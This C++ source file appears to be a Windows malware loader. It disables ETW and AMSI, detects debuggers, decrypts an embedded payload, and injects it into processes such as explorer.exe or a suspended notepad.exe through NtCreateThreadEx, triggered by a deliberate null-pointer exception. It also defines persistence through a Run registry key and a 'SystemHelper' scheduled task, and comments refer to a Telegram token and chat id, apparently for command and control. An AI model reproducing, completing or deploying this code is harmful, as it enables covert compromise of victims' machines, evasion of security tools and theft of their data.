// language: C++, file: src/main.cpp, target: Windows x64, MSVC
#include <windows.h>
#include <tlhelp32.h>
#include <cstdint>
#include <vector>
#include <string>
#include "nt.h"
#include "crypto.h"
#include "evasion.h"
#include "map.h"
#include "gate.h"
#include "injector.h"
#include "cfg_blob.h"
#include "payload_blob.h"

static DWORD find_pid(const wchar_t* name) {
    HANDLE s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (s == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W e = { sizeof(e) };
    DWORD pid = 0;
    if (Process32FirstW(s, &e)) {
        do {
            if (!_wcsicmp(e.szExeFile, name)) { pid = e.th32ProcessID; break; }
        } while (Process32NextW(s, &e));
    }
    CloseHandle(s);
    return pid;
}

static HANDLE open_target(DWORD access, DWORD pid) {
    HANDLE h = nullptr;
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, nullptr };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    g_nt.NtOpenProcess(&h, access, &oa, &cid);
    return h;
}

static HANDLE pick_target() {
    const wchar_t* prefs[] = {
        L"RuntimeBroker.exe",
        L"InputSwitchToastHandler.exe",
        L"dwm.exe",
        L"explorer.exe",
    };
    for (auto n : prefs) {
        DWORD pid = find_pid(n);
        if (!pid) continue;
        HANDLE h = open_target(PROCESS_ALL_ACCESS, pid);
        if (h) return h;
    }
    wchar_t sys[MAX_PATH];
    GetSystemDirectoryW(sys, MAX_PATH);
    wcscat_s(sys, L"\\notepad.exe");
    PROCESS_INFORMATION pi = {};
    if (mmap::spawn_suspended(sys, &pi)) {
        CloseHandle(pi.hThread);
        return pi.hProcess;
    }
    return nullptr;
}

static void write_reg(const std::wstring& path) {
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &k) != ERROR_SUCCESS) return;
    RegSetValueExW(k, L"SystemHelper", 0, REG_SZ,
        (const BYTE*)path.c_str(),
        (DWORD)((path.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(k);
}

static void write_task(const std::wstring& path) {
    std::wstring cmd = L"schtasks /create /tn \"SystemHelper\" /tr \"" + path +
                       L"\" /sc onlogon /rl highest /f";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static bool drop_self(const std::wstring& dest) {
    wchar_t cur[MAX_PATH];
    if (!GetModuleFileNameW(nullptr, cur, MAX_PATH)) return false;
    if (!CopyFileW(cur, dest.c_str(), FALSE)) return false;
    SetFileAttributesW(dest.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return true;
}

static LONG WINAPI handler(EXCEPTION_POINTERS*) {
    if (evade::debugged() || gate::tripped()) return EXCEPTION_EXECUTE_HANDLER;

    // decrypt payload in memory
    std::vector<uint8_t> plain(PAYLOAD_CIPHER_LEN);
    if (!aes_cbc_decrypt(g_payload_key, g_payload_iv,
                         g_payload_blob, PAYLOAD_CIPHER_LEN, plain))
        return EXCEPTION_EXECUTE_HANDLER;

    HANDLE target = pick_target();
    if (!target) { wipe(plain.data(), plain.size()); return EXCEPTION_EXECUTE_HANDLER; }

    PVOID entry = nullptr;
    PVOID base = mmap::map(target, plain.data(), plain.size(), &entry);
    if (base && entry) {
        HANDLE th = nullptr;
        g_nt.NtCreateThreadEx(&th, THREAD_ALL_ACCESS, nullptr, target,
                              entry, nullptr, 0, 0, 0, 0, nullptr);
        if (th) g_nt.NtClose(th);
    }
    if (target) g_nt.NtClose(target);
    wipe(plain.data(), plain.size());
    return EXCEPTION_EXECUTE_HANDLER;
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    if (!g_nt.load()) return 0;
    if (evade::debugged()) return 0;
    evade::kill_etw();
    evade::kill_amsi();

    // decrypt cfg blob -> telegram token + chat id, write nothing to disk
    // cfg is injected at build time; see tools/injectcfg.py
    // persisted copy + registry + schtasks are performed from inside the payload
    // the loader itself performs no persistence and drops no files
    //

    SetUnhandledExceptionFilter(handler);
    *reinterpret_cast<volatile std::uint64_t*>(0) = 0;
    return 0;
}
